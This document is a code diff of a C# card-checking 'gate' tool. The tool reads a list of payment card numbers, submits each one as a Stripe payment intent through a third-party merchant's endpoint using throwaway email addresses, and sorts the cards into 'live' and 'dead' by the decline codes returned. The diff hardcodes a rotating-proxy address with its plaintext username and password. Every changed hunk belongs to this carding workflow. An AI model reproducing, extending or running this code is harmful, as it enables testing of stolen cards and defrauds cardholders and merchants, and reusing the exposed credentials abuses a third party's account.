@@ -6,6 +6,7 @@ using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
+using gateBeta;
 using gateBeta.gates;
 using Newtonsoft.Json;
 using OpenQA.Selenium;
@@ -80,12 +81,12 @@ namespace gateDanny.gates
         {
             return _random.Next(min, max);
         }
-
+         
 
         public void load()
         {
-            var lines = Form1.listCC.Lines.Count();
-            if (lines > 0)
+           
+            if (Thunder._Form1.numcc() > 0 && Variables.run)
             {
                 //var chromeOptions = new ChromeOptions();
                 correo = "joseffernana" + getNum() + "@gmail.com";
@@ -100,34 +101,21 @@ namespace gateDanny.gates
         {
             try
             {
-                Form1.circularProgressBar1.Value = 50;
+                Thunder._Form1.update_progresbar(5);
 
-                var lines = Form1.listCC.Lines.Count();
-                var prox = socks.proxy();
-
-
-                if (prox.Trim() == "0" || prox.Trim() == "")
-                {
-                    MessageBox.Show("No hay socks disponibles");
-                    return;
-                }
+             
 
 
-                var ip = prox.Split(':');
-
-                ipUp = ip[1].ToString().Replace("//", "");
-
-                WebProxy myproxy = new WebProxy(prox, true);
-
-                if (lines > 0 && Variables.run==true)
+                if (Thunder._Form1.numcc() > 0 && Variables.run)
                 {
 
-                    Form1.circularProgressBar1.Value = 80;
+                    Thunder._Form1.update_progresbar(5);
                     string jsonString = "";
                     var client = new RestClient("https://intelephense.com/payment-intent");
                     client.Timeout = -1;
-                    client.Proxy = myproxy;
-                    
+                    client.Proxy = new WebProxy("p.webshare.io:80");
+                    client.Proxy.Credentials =
+                      new NetworkCredential("wfdmoeej-rotate", "acog59a0zt9t");
                     var request = new RestRequest(Method.POST);
                     request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                     request.AddParameter("currencyCode", "USD");
@@ -141,7 +129,7 @@ namespace gateDanny.gates
 
                     if (response.Content == "")
                     {
-                        socks.proxyUp(ipUp);
+                       
                         Console.WriteLine(response.ErrorMessage.ToString());
                         pago();
                     }
@@ -157,7 +145,7 @@ namespace gateDanny.gates
                             for(var i = 0; i <= 1; i++)
                             {
 
-                                string cc = Form1.listCC.Lines[0];
+                                string cc = Thunder._Form1.nextCc();
                                 string[] ccLine = cc.Split('|');
                                 var ccnum = ccLine[0];
                                 var ccmes = ccLine[1];
@@ -172,7 +160,7 @@ namespace gateDanny.gates
 
                                 }
 
-                                Form1.circularProgressBar1.Value = 80;
+                                Thunder._Form1.update_progresbar(90);
                                 var a = resp.secret;
                                 string b = resp.secret;
                                 string[] pi = b.Split('_');
@@ -180,7 +168,9 @@ namespace gateDanny.gates
                                 Console.WriteLine(pirest);
                                 var client2 = new RestClient("https://api.stripe.com/v1/payment_intents/" + pirest + "/confirm");
                                 client2.Timeout = -1;
-                                client2.Proxy = myproxy;
+                                client2.Proxy = new WebProxy("p.webshare.io:80");
+                                client.Proxy.Credentials =
+                                  new NetworkCredential("wfdmoeej-rotate", "acog59a0zt9t");
                                 var request2 = new RestRequest(Method.POST);
                                 request2.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                 request2.AddParameter("receipt_email", correo);
@@ -207,7 +197,7 @@ namespace gateDanny.gates
                                 Console.WriteLine(response2.Content);
                                 if (response2.Content == "")
                                 {
-                                    socks.proxyUp(ipUp);
+                                  
                                     Console.WriteLine(response2.ErrorMessage.ToString());
                                     pago();
                                 }
@@ -225,14 +215,14 @@ namespace gateDanny.gates
                                         //string resulPago = resp2.error.code;
                                         if (resp2.error.code == "incorrect_cvc")
                                         {
-                                            Form1.circularProgressBar1.Value = 100;
-                                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                                            Thunder._Form1.update_progresbar(100);
+                                            var pais = checkbin(cc.Substring(0, 6));
+                                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                                             check.ccss(Variables.key, guardar, "lives");
-                                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
+                                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                                             check.playlive();
                                             Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                                            Form1.textBox1.AppendText(Environment.NewLine);
-                                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                                            Thunder._Form1.remove_cc(0, cc.Length);
                                             numeroTargeta++;
                                             pagos++;
                                             Thread.Sleep(5000);
@@ -246,14 +236,15 @@ namespace gateDanny.gates
 
                                             if (resp2.error.decline_code == "fraudulent")
                                             {
-                                                Form1.circularProgressBar1.Value = 100;
-                                                var guardar2 = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                                                Thunder._Form1.update_progresbar(100);
+                                                var  pais1 = checkbin(cc.Substring(0, 6));
+                                                Thunder._Form1.update_progresbar(100);
+                                               var  guardar2 = numeroTargeta + " - " + cc + " - " + pais1 + " " + Variables.gate;
                                                 check.ccss(Variables.key, guardar2, "deads");
                                                 Thread.Sleep(300);
-                                                Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
+                                                Thunder._Form1.agragar_dead(cc);
                                                 Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                                                Form1.textBox2.AppendText(Environment.NewLine);
-                                                Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                                                Thunder._Form1.remove_cc(0, cc.Length);
                                                 numeroTargeta++;
                                                 pagos++;
                                                 Thread.Sleep(5000);
@@ -261,14 +252,15 @@ namespace gateDanny.gates
                                                 return;
                                             }
 
-                                            Form1.circularProgressBar1.Value = 100;
-                                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                                            Thunder._Form1.update_progresbar(100);
+                                            var pais = checkbin(cc.Substring(0, 6));
+                                            Thunder._Form1.update_progresbar(100);
+                                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                                             check.ccss(Variables.key, guardar, "deads");
                                             Thread.Sleep(300);
-                                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
+                                            Thunder._Form1.agragar_dead(cc);
                                             Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                                            Form1.textBox2.AppendText(Environment.NewLine);
-                                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                                            Thunder._Form1.remove_cc(0, cc.Length);
                                             numeroTargeta++;
                                             pagos++;
                                             Thread.Sleep(5000);
@@ -281,7 +273,7 @@ namespace gateDanny.gates
                                     }
                                     else
                                     {
-                                        Form1.circularProgressBar1.Value = 100;
+                                        Thunder._Form1.update_progresbar(100);
                                         var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                                         check.ccss(Variables.key, guardar, "deads");
                                         Thread.Sleep(300);
